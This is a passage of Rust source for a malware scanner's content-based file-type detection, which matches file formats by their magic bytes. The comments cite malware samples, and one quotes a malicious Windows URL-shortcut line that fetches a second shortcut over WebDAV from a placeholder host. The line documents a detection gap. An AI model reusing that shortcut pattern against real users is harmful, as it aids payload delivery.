//! Content-based detection: magic bytes, shebangs, and structural markers.
//!
//! Uses a first-byte jump table to avoid sequential if-chains. Most files are
//! identified by examining only the first 4-20 bytes.

use std::{io::Read, path::Path};

use super::{ArchiveFormat, Compression, DetectionSource, FileType, container_of};

/// LNK shell link CLSID header (20 bytes).
const LNK_MAGIC: &[u8] = &[
    0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x46,
];

/// Opening section of a Windows URL shortcut. Section names are matched
/// case-insensitively, as Windows itself matches them.
const URL_SHORTCUT_SECTION: &[u8] = b"[InternetShortcut]";

/// Compiled Android XML. The container chunk says how long the document is,
/// and the next chunk is the string pool. Both have to agree; `03 00 08 00`
/// by itself is four bytes and shows up in unrelated binaries.
fn looks_like_axml(data: &[u8]) -> bool {
    if data.len() < 12 || data.len() > 16 * 1024 * 1024 {
        return false;
    }
    let chunk_type = u16::from_le_bytes([data[0], data[1]]);
    let header_size = u16::from_le_bytes([data[2], data[3]]);
    let file_size = u32::from_le_bytes([data[4], data[5], data[6], data[7]]) as usize;
    chunk_type == 0x0003
        && header_size == 8
        && file_size == data.len()
        && data[8] == 0x01
        && data[9] == 0x00
}

/// Detect file type from content. Returns the type and how it was detected.
pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType, DetectionSource)> {
    if data.len() < 2 {
        return None;
    }
    // Every binary header this module claims by a short signature carries a
    // NUL or control byte near the front; a script that merely opens with the
    // same letters (`MZ=1;…`, `true && …`, `GIF89a=…`) carries none.
    let text = is_text(&data[..data.len().min(TEXT_PROBE)]);

    // ISO base media (`.mp4`/`.m4a`/`.mov`): the size-prefixed `ftyp` box.
    // Keyed at offset 4, so it cannot live in the first-byte jump table.
    if !text && data.len() >= 12 && &data[4..8] == b"ftyp" {
        return Some((FileType::Mp4, DetectionSource::Magic));
    }

    // A Windows URL shortcut: an INI whose first section is
    // `[InternetShortcut]`. It carries no magic number and scores as no known
    // language, so a copy named `invoice.pdf.url` came back `unknown` -- and an
    // unidentified archive member is skipped whole. One in this corpus is the
    // entire payload of a delivery zip: `URL=file:\\<ip>@80\...\scan.pdf.lnk`,
    // a WebDAV fetch of a second shortcut, padded to 346 KB with NULs.
    let head = data.trim_ascii_start();
    if head.len() >= URL_SHORTCUT_SECTION.len()
        && head[..URL_SHORTCUT_SECTION.len()].eq_ignore_ascii_case(URL_SHORTCUT_SECTION)
    {
        return Some((FileType::Text, DetectionSource::Magic));
    }

    // Windows Script Host documents: a `.wsf` job, a `.wsc` component or a
    // `.sct` scriptlet is XML whose `<script language=...>` names what runs.
    // The XML arm below would call the prolog'd ones plain XML, and markup
    // sniffing called the rest HTML, so a VBScript dropper in a `<job>` was
    // never scored as a script.
    if let Some(ft) = windows_script_host(data) {
        return Some((ft, DetectionSource::Magic));
    }

    // Script Encoder output (`.vbe`, `.jse`): `#@~^`, a six-character base64
    // length, `==`. The body is ciphertext full of control bytes, so it was
    // typed opaque data.
    if let Some(ft) = encoded_script(path, head) {
        return Some((ft, DetectionSource::Magic));
    }

    // Lockfiles announce themselves in their opening lines. Hopper copies are
    // often renamed `yarn.<sha>.lock`, so the header, not the name, has to
    // carry them to the lockfile traits.
    if let Some(ft) = lockfile_header(data) {
        return Some((ft, DetectionSource::Magic));
    }

    // An HTML document, whatever it is called and however it is indented.
    // Keyed off `head` rather than `data` because real pages are not flush
    // left: four VirusShare samples open with four spaces before the doctype,
    // which a `starts_with` on byte 0 misses, and they were then scored as
    // JavaScript on the strength of the jQuery inside them.
    //
    // Both unambiguous openings are accepted. Nothing but a web page starts
    // `<!DOCTYPE html`, and a file whose first bytes are `<html` is one too --
    // that is narrower than the `<body`/`<div`/`<script` shapes, which also
    // open templates and fragments that other arms own and which stay out of
    // magic deliberately. `<!DOCTYPE svg` and an `<?xml` prolog are unaffected:
    // neither begins with either of these.
    // PostScript and EPS. `%!PS` at the start is the format; a `.ps` extension
    // is only the fallback for a file that does not carry the header.
    if head.len() >= 4 && head.starts_with(b"%!PS") {
        return Some((FileType::PostScript, DetectionSource::Magic));
    }

    // Android binary XML: chunk type 0x0003, header size 8, a file-size field
    // that covers this buffer, and a string-pool chunk next. A `.xml` name
    // used to be the only signal, so a compiled layout was "XML" by extension
    // while the text parser never saw a tag.
    if looks_like_axml(data) {
        return Some((FileType::Xml, DetectionSource::Magic));
    }

    if head.len() >= 5 {
        let doctype_html = head.len() >= 14 && head[..14].eq_ignore_ascii_case(b"<!DOCTYPE html");
        let html_root = head[..5].eq_ignore_ascii_case(b"<html")
            && head.get(5).is_none_or(|c| !c.is_ascii_alphanumeric());
        if doctype_html || html_root {
            return Some((FileType::Html, DetectionSource::Magic));
        }
    }

    if looks_like_udif_dmg(data) {
        return Some((FileType::Dmg, DetectionSource::Magic));
    }

    if looks_like_iso_or_udf(data) {
        return Some((FileType::Iso, DetectionSource::Magic));
    }

    // ── First-byte jump table ────────────────────────────────────────
    // Dispatch on data[0] to avoid evaluating 30+ conditions sequentially.
    // Each arm only checks formats that start with that byte.
    let result = match data[0] {
        0x00 => {
            // AppleDouble (`._<name>`) resource forks: 00 05 16 07.
            // macOS routinely smuggles these into tarballs alongside real
            // files. Their bodies are binary metadata blobs (xattrs, finder
            // info, resource forks), not the file types their extension
            // claims. Return Unknown so cleave's `is_program()` skip kicks
            // in — otherwise `._foo.php` gets analyzed as PHP, the binary
            // body trips entropy/obfuscation traits, and a benign Composer
            // tarball lights up at suspicious.
            if data.len() >= 4 && data[1] == 0x05 && data[2] == 0x16 && data[3] == 0x07 {
                Some((FileType::Unknown, DetectionSource::Magic))
            } else if data.len() >= 6
                && data[1] == 0x00
                && matches!(data[2], 0x01 | 0x02)
                && data[3] == 0x00
                && u16::from_le_bytes([data[4], data[5]]) > 0
                && u16::from_le_bytes([data[4], data[5]]) <= 512
            {
                // Windows icon/cursor: reserved=0, type=1|2, then a plausible
                // image count. Checked before the sfnt arm because sfnt 1.0 is
                // `00 01 00 00`, which an icon header can never be (its type
                // field would have to be 0x0100).
                Some((FileType::Ico, DetectionSource::Magic))
            } else if data.starts_with(&[0x00, 0x01, 0x00, 0x00])
                && !data[4..].starts_with(b"Standard Jet DB")
                && !data[4..].starts_with(b"Standard ACE DB")
            {
                // sfnt version 1.0 — the TrueType flavor every `.ttf` uses.
                // A Microsoft Access database opens with the same four bytes
                // and then names its engine, so an .mdb/.accdb would otherwise
                // be handed to the font parser and read as a corrupt font
                // rather than as a database with macros in it. Seen on
                // vxheaven's Virus.MSAccess.Detox.a.
                // Four bytes is a weak signature, so this arm is reached only
                // after the AppleDouble check above and is confirmed
                // downstream by formats/font.rs walking the table directory.
                Some((FileType::Font, DetectionSource::Magic))
            } else if data.len() >= 8 && &data[1..4] == b"asm" && data[4..8] == [0x01, 0, 0, 0] {
                // WebAssembly binary module: `\0asm` magic followed by the
                // little-endian u32 version (`01 00 00 00`). The version guard
                // keeps `\0asm`-prefixed binary noise from misclassifying.
                Some((FileType::Wasm, DetectionSource::Magic))
            } else {
                None
            }
        }
        0x7F => {
            // ELF: 7F 45 4C 46
            if data.len() >= 4 && data[1] == b'E' && data[2] == b'L' && data[3] == b'F' {
                Some((FileType::Elf, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'M' => {
            // PE: MZ, or Cabinet: MSCF
            if data[1] == b'Z' {
                Some((FileType::Pe, DetectionSource::Magic))
            } else if data.len() >= 4 && data[1] == b'S' && data[2] == b'C' && data[3] == b'F' {
                Some((FileType::Cab, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'P' => {
            // ZIP/JAR/OOXML: PK
            if data[1] == b'K' {
                Some(classify_pk(path, data))
            } else {
                None
            }
        }
        0xCA => {
            // Java class and Mach-O fat both start with CAFEBABE.
            // Java's bytes 6..8 are the class-file `major_version`
            // (45 = Java 1.1, 52 = Java 8, 65 = Java 21 — well over
            // a decade of headroom in 45..=70). Mach-O fat's bytes
            // 4..8 are `nfat_arch` (BE u32), realistically ≤ 12.
            //
            // Either signal alone misfires on random or hostile bytes
            // shaped like CAFEBABE: a junk file whose `major_version`
            // lands at 0x01F4 (500) fails the Java check, then the
            // Mach-O parser tries to slice with a several-billion
            // offset. Combine both checks so we only call it Mach-O
            // when nfat_arch is plausible AND the Java major isn't.
            if data.len() >= 8 && data[1] == 0xFE && data[2] == 0xBA && data[3] == 0xBE {
                let major = u16::from_be_bytes([data[6], data[7]]);
                let nfat_arch = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
                if (45..=70).contains(&major) || nfat_arch > 16 {
                    Some((FileType::JavaClass, DetectionSource::Magic))
                } else {
                    Some((FileType::MachO, DetectionSource::Magic))
                }
            } else {
                None
            }
        }
        0xFE => {
            // Mach-O: FEEDFACE (32-bit) or FEEDFACF (64-bit)
            if data.len() >= 4
                && data[1] == 0xED
                && data[2] == 0xFA
                && (data[3] == 0xCE || data[3] == 0xCF)
            {
                Some((FileType::MachO, DetectionSource::Magic))
            } else {
                None
            }
        }
        0xCE => {
            // Mach-O 32-bit swapped: CEFAEDFE
            if data.len() >= 4 && data[1] == 0xFA && data[2] == 0xED && data[3] == 0xFE {
                Some((FileType::MachO, DetectionSource::Magic))
            } else {
                None
            }
        }
        0xCF => {
            // Mach-O 64-bit swapped: CFFAEDFE
            if data.len() >= 4 && data[1] == 0xFA && data[2] == 0xED && data[3] == 0xFE {
                Some((FileType::MachO, DetectionSource::Magic))
            } else {
                None
            }
        }
        0xBE => {
            // Mach-O fat swapped: BEBAFECA
            if data.len() >= 4 && data[1] == 0xBA && data[2] == 0xFE && data[3] == 0xCA {
                Some((FileType::MachO, DetectionSource::Magic))
            } else {
                None
            }
        }
        0xFF => {
            // JPEG: FF D8 FF
            if data.len() >= 3 && data[1] == 0xD8 && data[2] == 0xFF {
                Some((FileType::Jpeg, DetectionSource::Magic))
            } else {
                None
            }
        }
        0x89 => {
            // PNG: 89 50 4E 47 0D 0A 1A 0A
            if data.starts_with(b"\x89PNG\r\n\x1a\n") {
                Some((FileType::Png, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'G' => {
            // GIF87a / GIF89a.
            if data.starts_with(b"GIF87a") || data.starts_with(b"GIF89a") {
                Some((FileType::Gif, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'O' => {
            // OpenType with CFF outlines: the sfnt version is the tag `OTTO`.
            if data.starts_with(b"OTTO") {
                Some((FileType::Font, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'w' => {
            // Web font wrappers: `wOFF` (WOFF 1) and `wOF2` (WOFF 2).
            if data.starts_with(b"wOFF") || data.starts_with(b"wOF2") {
                Some((FileType::Font, DetectionSource::Magic))
            } else {
                None
            }
        }
        b't' => {
            // Apple sfnt flavors: `true` (TrueType), `typ1` (PostScript in an
            // sfnt wrapper), `ttcf` (TrueType collection).
            if data.starts_with(b"true") || data.starts_with(b"typ1") || data.starts_with(b"ttcf") {
                Some((FileType::Font, DetectionSource::Magic))
            } else {
                None
            }
        }
        0xD0 => {
            // OLE2/CFBF: D0 CF 11 E0 A1 B1 1A E1. Shared by Office documents
            // (.doc/.xls/.ppt/.msg) and Windows Installer packages (.msi/.msp);
            // the root storage's CLSID says which. The name decides only when
            // the root directory sector lies outside the bytes at hand.
            if data.len() >= 8
                && data[1] == 0xCF
                && data[2] == 0x11
                && data[3] == 0xE0
                && data[4] == 0xA1
                && data[5] == 0xB1
                && data[6] == 0x1A
                && data[7] == 0xE1
            {
                let installer = ole_root_clsid(data).map_or_else(
                    || {
                        let ext = lowercase_ext(path);
                        matches!(ext.as_deref(), Some("msi" | "msp" | "mst" | "msm"))
                    },
                    |clsid| MSI_CLSIDS.contains(&clsid),
                );
                let ty = if installer {
                    FileType::Msi
                } else {
                    FileType::OleDoc
                };
                Some((ty, DetectionSource::Magic))
            } else {
                None
            }
        }
        0x4C => {
            // LNK: 4C 00 00 00 01 14 02 00 ...
            if data.len() >= LNK_MAGIC.len() && data.starts_with(LNK_MAGIC) {
                Some((FileType::Lnk, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'R' => {
            // RAR: Rar!
            if data.starts_with(b"Rar!") {
                Some((FileType::Rar, DetectionSource::Magic))
            } else if data.starts_with(b"REGEDIT4") {
                // A .reg file's first line names the format. `FileType::Registry`
                // was reachable only from a `.reg` extension, so a registry
                // script under any other name -- vxheaven's
                // `Trojan.WinREG.AntiFireWall.a`, where the `.a` is a variant
                // letter -- was typed by whatever the trailing component
                // happened to mean. Nothing but a registry script opens with
                // this line. REGEDIT4 is the Windows 9x/NT4 spelling; the
                // Windows 2000+ one is handled in the `W` arm below.
                Some((FileType::Registry, DetectionSource::Magic))
            } else if (data.starts_with(b"RIFF") || data.starts_with(b"RIFX")) && data.len() >= 12 {
                // RIFF container: `RIFF` + u32 length + form type. WAVE, WEBP
                // and AVI share the wrapper, so the form type at offset 8
                // decides. An animated cursor (`ACON`) is not audio.
                let kind = match &data[8..12] {
                    b"WEBP" => Some(FileType::Webp),
                    b"WAVE" => Some(FileType::Wav),
                    _ => None,
                };
                kind.map(|file_type| (file_type, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'F' => {
            // Compiled AppleScript: Fasd
            if data.starts_with(b"Fasd") {
                Some((FileType::AppleScript, DetectionSource::Magic))
            } else if data.len() >= 12 && data.starts_with(b"FOR1") && &data[8..12] == b"BEAM" {
                // Erlang/Elixir BEAM bytecode: IFF container `FOR1` <u32 size> `BEAM`.
                Some((FileType::Beam, DetectionSource::Magic))
            } else if data.len() >= 12
                && data.starts_with(b"FORM")
                && matches!(&data[8..12], b"AIFF" | b"AIFC")
            {
                // IFF audio shares the container family with BEAM above; the
                // form type at offset 8 is what separates them.
                Some((FileType::Aiff, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'd' => {
            // Dalvik executable bytecode: dex\n035\0, dex\n038\0, etc.
            if data.len() >= 8
                && data[1] == b'e'
                && data[2] == b'x'
                && data[3] == b'\n'
                && data[4].is_ascii_digit()
                && data[5].is_ascii_digit()
                && data[6].is_ascii_digit()
                && data[7] == 0
            {
                Some((FileType::Dex, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'I' => {
            // Compiled HTML Help: ITSF
            if data.starts_with(b"ITSF") {
                Some((FileType::Chm, DetectionSource::Magic))
            } else if data.starts_with(b"ID3") {
                // ID3v2-tagged MPEG audio.
                Some((FileType::Mp3, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'{' => {
            // RTF: {\rtf
            if data.starts_with(b"{\\rtf") {
                Some((FileType::Rtf, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'%' => {
            // PDF: %PDF-
            if data.starts_with(b"%PDF-") {
                Some((FileType::Pdf, DetectionSource::Magic))
            } else {
                None
            }
        }
        0x80 => looks_like_pickle(path, data).then_some((FileType::Pickle, DetectionSource::Magic)),
        b'b' => {
            // Binary Plist: bplist. A `.nib` with this magic is a keyed-archive
            // nib (NSKeyedArchiver output inside an older nib bundle), but the
            // bytes are a plain property list either way -- type it Plist so
            // every plist-aware consumer (including rule engines that don't
            // know a distinct Nib type) can address it.
            if data.starts_with(b"bplist") {
                Some((FileType::Plist, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'N' => {
            // Compiled Interface Builder archive (NIBArchive)
            if data.starts_with(b"NIBArchive") {
                Some((FileType::Nib, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'!' => {
            // Unix `ar` archive (`!<arch>\n`). This magic is shared by Debian
            // packages and static libraries (.a). Distinguish by the first `ar`
            // member: a `.deb` always leads with `debian-binary`; a static
            // library leads with a symbol/string table (`/`, `//`, `__.SYMDEF`)
            // or an object file. Without this split every `.a` was mis-typed as
            // `Deb`, so its object bytes were scanned as an opaque package.
            if data.starts_with(b"!<arch>\n") {
                let ty = if ar_first_member_is(data, b"debian-binary") {
                    FileType::Deb
                } else {
                    FileType::StaticLib
                };
                Some((ty, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'x' => {
            // XAR (macOS PKG): xar!
            if data.starts_with(b"xar!") {
                Some((FileType::PkgMacos, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'C' => {
            // Chrome extension: Cr24
            if data.starts_with(b"Cr24") {
                Some((FileType::Crx, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'h' => {
            // SquashFS superblock, little-endian: hsqs
            if data.starts_with(b"hsqs") {
                Some((squashfs_type(path), DetectionSource::Magic))
            } else {
                None
            }
        }
        b's' => {
            // SquashFS superblock, big-endian: sqsh
            if data.starts_with(b"sqsh") {
                Some((squashfs_type(path), DetectionSource::Magic))
            } else {
                None
            }
        }
        b'-' => {
            // ASCII-armored OpenPGP detached signature. The binary packet form
            // has no byte we can claim safely — its tag byte collides with PNG
            // and other formats — so that one is left to the extension.
            if data.starts_with(b"-----BEGIN PGP SIGNATURE-----") {
                Some((FileType::PgpSignature, DetectionSource::Magic))
            } else {
                None
            }
        }
        0xED => {
            // RPM: ED AB EE DB
            if data.len() >= 4 && data[1] == 0xAB && data[2] == 0xEE && data[3] == 0xDB {
                Some((FileType::Rpm, DetectionSource::Magic))
            } else {
                None
            }
        }
        0x1F => {
            // Gzip: 1F 8B, then CM 8 (deflate), the only method ever defined.
            // What it wraps is read, not guessed from the name: npm packages,
            // sdists and crates arrive as `<hash>.sample` in content-addressed
            // stores.
            if data[1] == 0x8B && data.get(2) == Some(&8) {
                let inside = tar_layout(
                    flate2::read::GzDecoder::new(data).take(TAR_PEEK_LIMIT),
                    false,
                );
                let ft = classify_tar(path, data, Compression::Gzip, inside);
                Some((ft.unwrap_or(FileType::Gz), DetectionSource::Magic))
            } else {
                None
            }
        }
        0xFD => {
            // XZ: FD 37 7A 58 5A 00. No xz decoder is linked, so only the name
            // can say whether a tar is inside.
            if data.starts_with(b"\xfd7zXZ\0") {
                let ft = classify_tar(path, data, Compression::Xz, Inside::Unreadable);
                Some((ft.unwrap_or(FileType::Xz), DetectionSource::Magic))
            } else {
                None
            }
        }
        b'B' => {
            if looks_like_bmp(data) {
                Some((FileType::Bmp, DetectionSource::Magic))
            } else if data.len() >= 10
                && data.starts_with(b"BZh")
                && (b'1'..=b'9').contains(&data[3])
                && matches!(&data[4..10], b"1AY&SY" | b"\x17\x72\x45\x38\x50\x90")
            {
                // Bzip2: `BZh`, the block-size digit, then the first block's
                // magic (BCD pi) or, for an empty stream, the end-of-stream
                // magic (BCD sqrt(pi)). No bzip2 decoder is linked, so only the
                // name can say whether a tar is inside.
                let ft = classify_tar(path, data, Compression::Bzip2, Inside::Unreadable);
                Some((ft.unwrap_or(FileType::Bz2), DetectionSource::Magic))
            } else {
                None
            }
        }
        b'0' => {
            // ASCII CPIO. The six-digit magic alone is six ordinary digits, so
            // require the whole fixed-size header to be digits of its radix.
            if looks_like_ascii_cpio(data) {
                Some((FileType::Cpio, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'7' => {
            // 7z: 37 7A BC AF 27 1C
            if data.starts_with(b"7z\xBC\xAF\x27\x1C") {
                Some((FileType::SevenZ, DetectionSource::Magic))
            } else {
                None
            }
        }
        0x28 => {
            // Zstandard: 28 B5 2F FD
            if data.len() >= 4 && data[1] == 0xB5 && data[2] == 0x2F && data[3] == 0xFD {
                // FreeBSD, Arch and Void packages are all zstd tars; their
                // leading members say which.
                let inside = zstd::stream::read::Decoder::new(data)
                    .map_or(Inside::Unreadable, |d| {
                        tar_layout(d.take(TAR_HEAD_LIMIT), false)
                    });
                let ft = classify_tar(path, data, Compression::Zstd, inside);
                Some((ft.unwrap_or(FileType::Zst), DetectionSource::Magic))
            } else {
                None
            }
        }
        b'#' => {
            // Shebang: #!
            if data[1] == b'!' {
                detect_shebang(data)
            } else {
                None
            }
        }
        0xEF => {
            // A UTF-8 BOM ahead of a shebang: Windows editors write it along
            // with CRLF. The kernel will not exec it, but `perl x`, `python x`
            // and `bash x` still run the body, so it is still that language.
            match data.strip_prefix(b"\xEF\xBB\xBF") {
                Some(rest) if rest.starts_with(b"#!") => detect_shebang(rest),
                _ => None,
            }
        }
        b'/' => {
            // Xcode writes this exact comment as the first line of every
            // `project.pbxproj`; it is the format's only signature.
            if data.starts_with(b"// !$*UTF8*$!") {
                Some((FileType::Pbxproj, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'W' => {
            // `Windows Registry Editor Version 5.00` — the modern .reg header,
            // written as UTF-8 or (far more often) UTF-16LE with a BOM, which
            // the BOM-stripping caller has already unwrapped by the time this
            // runs. Same reasoning as the `REGEDIT4` arm above.
            if data.starts_with(b"Windows Registry Editor Version") {
                Some((FileType::Registry, DetectionSource::Magic))
            } else {
                None
            }
        }
        b'<' => {
            // PHP opening tag: <?php
            if data.starts_with(b"<?php") {
                Some((FileType::Php, DetectionSource::Magic))
            } else {
                detect_xml(data)
            }
        }
        _ => None,
    };

    // A short signature proves nothing when only text follows it. Formats
    // whose header is text by design keep their claim.
    if let Some((ft, source)) = result {
        if source != DetectionSource::Magic || !text || has_text_header(ft) {
            return result;
        }
    }

    // ── Fallback checks (rare paths) ─────────────────────────────────
    // These are guarded by cheap pre-checks to avoid unnecessary work.

    // Uncompressed tar carries no leading magic — the `ustar` signature sits at
    // offset 257. Its members say whether it is a gem, an OCI image, a Gentoo
    // package or a plain tar.
    //
    // This used to fall through to the extension fallback, which meant a tar
    // was only recognized when it was *named* `.tar`: the same bytes under any
    // other extension were typed `Data` and never walked, so every member went
    // unanalyzed. That is a detection gap an attacker gets for free by renaming
    // a file — an XMRig 6.24.0 release tarball named `<sha256>.bin` scored one
    // finding as an opaque blob and six once renamed to `.tar`.
    if data.len() > 262 && &data[257..262] == b"ustar" {
        let ft = classify_tar(path, data, Compression::None, tar_layout(data, true));
        return Some((ft.unwrap_or(FileType::Tar), DetectionSource::Magic));
    }

    // Python bytecode: a little-endian magic number that ends in `\r\n`,
    // then flags or a timestamp. CPython 2.0–2.7 used 50823..=62211; 3.x
    // counts up from 3000 (3.14 is 3627).
    if !text && data.len() >= 8 && &data[2..4] == b"\r\n" {
        let magic = u16::from_le_bytes([data[0], data[1]]);
        if (3000..4000).contains(&magic) || (50823..=62211).contains(&magic) {
            return Some((FileType::PythonBytecode, DetectionSource::Magic));
        }
    }

    // Tampered PE: only scan if there's an 'M' in the first 64 bytes
    if memchr::memchr(b'M', &data[1..data.len().min(64)]).is_some() {
        if let Some(ft) = detect_tampered_pe(data) {
            return Some((ft, DetectionSource::Magic));
        }
    }

    // Markup after a BOM or leading whitespace.
    if let Some(r) = detect_xml(data) {
        return Some(r);
    }

    if looks_like_asar(data) {
        return Some((FileType::Asar, DetectionSource::Magic));
    }

    if looks_like_lzma_alone(data) {
        return Some((FileType::Lzma, DetectionSource::Magic));
    }

    if looks_like_github_actions_workflow(path, data) {
        return Some((FileType::GithubActions, DetectionSource::Heuristic));
    }

    // Manifest files — only check if there's a filename component
    if path.file_name().is_some() {
        if let Some(ft) = detect_manifest(path, data) {
            return Some((ft, DetectionSource::Filename));
        }
    }

    None
}

/// Peek the first `ar` member's name and compare it to `want`.
///
/// An `ar` archive is `!<arch>\n` (8 bytes) followed by fixed 60-byte member
/// headers; the name is the leading 16-byte field, space-padded and sometimes
/// terminated with `/` (GNU). Used to tell a Debian package (first member
/// `debian-binary`) from a static library (a symbol/string table or object).
/// A SquashFS image is the wire format of a Snap package, so the superblock
/// magic alone cannot tell the two apart — reading `meta/snap.yaml` would mean
/// decompressing the filesystem. The `.snap` extension is the available signal,
/// mirroring how `.xbps` separates a Void package from a generic zstd tar.
fn squashfs_type(path: &Path) -> FileType {
    if path_ends_with_ci(path, b".snap") {
        FileType::Snap
    } else {
        FileType::SquashFs
    }
}

fn ar_first_member_is(data: &[u8], want: &[u8]) -> bool {
    const AR_MAGIC_LEN: usize = 8; // "!<arch>\n"
    let Some(field) = data.get(AR_MAGIC_LEN..AR_MAGIC_LEN + 16) else {
        return false;
    };
    let end = field.iter().rposition(|&b| b != b' ').map_or(0, |p| p + 1);
    let name = &field[..end];
    let name = name.strip_suffix(b"/").unwrap_or(name);
    name == want
}

/// ASCII CPIO (`odc`, `newc`, `newc`+checksum), identified by a complete and
/// well-formed fixed-size first header rather than by the magic alone. Binary
/// and RPM-stripped CPIO carry different framing and are not claimed here.
fn looks_like_ascii_cpio(data: &[u8]) -> bool {
    let (header, radix) = match data.get(..6) {
        Some(b"070707") => (76, 8),
        Some(b"070701" | b"070702") => (110, 16),
        _ => return false,
    };
    data.get(6..header).is_some_and(|fields| {
        fields.iter().all(|b| match radix {
            8 => matches!(b, b'0'..=b'7'),
            _ => b.is_ascii_hexdigit(),
        })
    })
}

fn looks_like_udif_dmg(data: &[u8]) -> bool {
    if data.len() < 512 {
        return false;
    }
    let trailer = &data[data.len() - 512..];
    if !trailer.starts_with(b"koly") {
        return false;
    }

    let version = u32::from_be_bytes([trailer[4], trailer[5], trailer[6], trailer[7]]);
    let header_size = u32::from_be_bytes([trailer[8], trailer[9], trailer[10], trailer[11]]);
    version >= 4 && header_size == 512
}

/// Optical-disc image (`.iso`): ISO 9660 and/or UDF.
///
/// The Volume Descriptor set begins at sector 16 (offset `0x8000`); each
/// 2048-byte descriptor is `[type:1][standard_identifier:5]`. ISO 9660 volume
/// descriptors carry `"CD001"`; a UDF bridge Volume Recognition Sequence carries
/// `"BEA01"`/`"NSR02"`/`"NSR03"`/`"TEA01"` (Windows install media are UDF). Either
/// identifier in the first several sectors means 7-Zip can unpack the image.
fn looks_like_iso_or_udf(data: &[u8]) -> bool {
    (16..=22usize).any(|sector| {
        let off = sector * 2048 + 1;
        data.len() >= off + 5
            && matches!(
                &data[off..off + 5],
                b"CD001" | b"BEA01" | b"NSR02" | b"NSR03" | b"TEA01"
            )
    })
}

/// Case-insensitive suffix match on path bytes (no allocation).
fn path_ends_with_ci(path: &Path, suffix: &[u8]) -> bool {
    let s = path.to_string_lossy();
    let bytes = s.as_bytes();
    if bytes.len() < suffix.len() {
        return false;
    }
    bytes[bytes.len() - suffix.len()..].eq_ignore_ascii_case(suffix)
}

/// How much of a file [`is_text`] reads. Binary headers put a NUL or a
/// control byte well inside it: a PE's `e_lfanew`, a font's table count, a
/// RIFF or ISO-BMFF box size.
const TEXT_PROBE: usize = 64;

/// Whether `head` reads as plain text: UTF-8 with no control bytes other
/// than whitespace. A character cut off by the end of the probe still counts.
fn is_text(head: &[u8]) -> bool {
    let control = |b: &u8| (*b < 0x20 && !matches!(b, b'\t' | b'\n' | b'\r' | 0x0C)) || *b == 0x7F;
    if head.iter().any(control) {
        return false;
    }
    match std::str::from_utf8(head) {
        Ok(_) => true,
        Err(e) => e.error_len().is_none(),
    }
}

/// Formats whose header is text by design, so an all-text head is no reason
/// to doubt them: markup, registry scripts, PDF, RTF, ASCII armor, and the
/// archives whose member headers are ASCII (`ar`, ASCII cpio).
fn has_text_header(ft: FileType) -> bool {
    matches!(
        ft,
        FileType::Php
            | FileType::Xml
            | FileType::Plist
            | FileType::Svg
            | FileType::Registry
            | FileType::Pbxproj
            | FileType::PgpSignature
            | FileType::Pdf
            | FileType::Rtf
            | FileType::Cpio
            | FileType::Deb
            | FileType::StaticLib
    )
}

/// A lockfile's tool-written header: pnpm's first line, or a line of the
/// leading comment block that Yarn v1, Cargo or Poetry write.
fn lockfile_header(data: &[u8]) -> Option<FileType> {
    let head = &data[..data.len().min(512)];
    let head = head.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(head);
    let lines = head.split(|&b| b == b'\n').map(<[u8]>::trim_ascii_end);
    if lines.clone().next()?.starts_with(b"lockfileVersion:") {
        return Some(FileType::PnpmLock);
    }
    lines
        .take_while(|line| line.is_empty() || line.starts_with(b"#"))
        .find_map(|line| {
            if line == b"# yarn lockfile v1" {
                Some(FileType::YarnLock)
            } else if line.starts_with(b"# This file is automatically @generated by Cargo.") {
                Some(FileType::CargoLock)
            } else if line.starts_with(b"# This file is automatically @generated by Poetry") {
                Some(FileType::PoetryLock)
            } else {
                None
            }
        })
}

/// Root-storage CLSIDs of Windows Installer databases: package (and merge
/// module), patch, and transform — `{000C1084,86,82-0000-0000-C000-000000000046}`
/// in on-disk byte order.
const MSI_CLSIDS: [[u8; 16]; 3] = [
    *b"\x84\x10\x0C\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46",
    *b"\x86\x10\x0C\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46",
    *b"\x82\x10\x0C\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46",
];

/// The CLSID of a compound file's root storage: the first entry of the first
/// directory sector. `None` when that sector is not within `data`.
fn ole_root_clsid(data: &[u8]) -> Option<[u8; 16]> {
    let shift = u16::from_le_bytes(data.get(0x1E..0x20)?.try_into().ok()?);
    if !matches!(shift, 9 | 12) {
        return None;
    }
    let first = u32::from_le_bytes(data.get(0x30..0x34)?.try_into().ok()?) as usize;
    let at = first
        .checked_add(1)?
        .checked_mul(1 << shift)?
        .checked_add(0x50)?;
    data.get(at..at + 16)?.try_into().ok()
}

/// The pickle `torch.save` wrote before its zip format: protocol 2, then a
/// ten-byte LONG1 holding the magic number 0x1950a86a20f9469cfc6c.
const TORCH_LEGACY_MAGIC: &[u8] = b"\x80\x02\x8a\x0a\x6c\xfc\x9c\x46\xf9\x20\x6a\xa8\x50\x19";

/// Python pickle. Protocol 4 and 5 open with a FRAME whose u64 length has
/// no business near 2^40, and legacy `torch.save` with its own magic: either
/// is the format itself. Protocols 2 and 3 open with two bytes that other
/// binary formats share, so there the name has to agree.
fn looks_like_pickle(path: &Path, data: &[u8]) -> bool {
    match data {
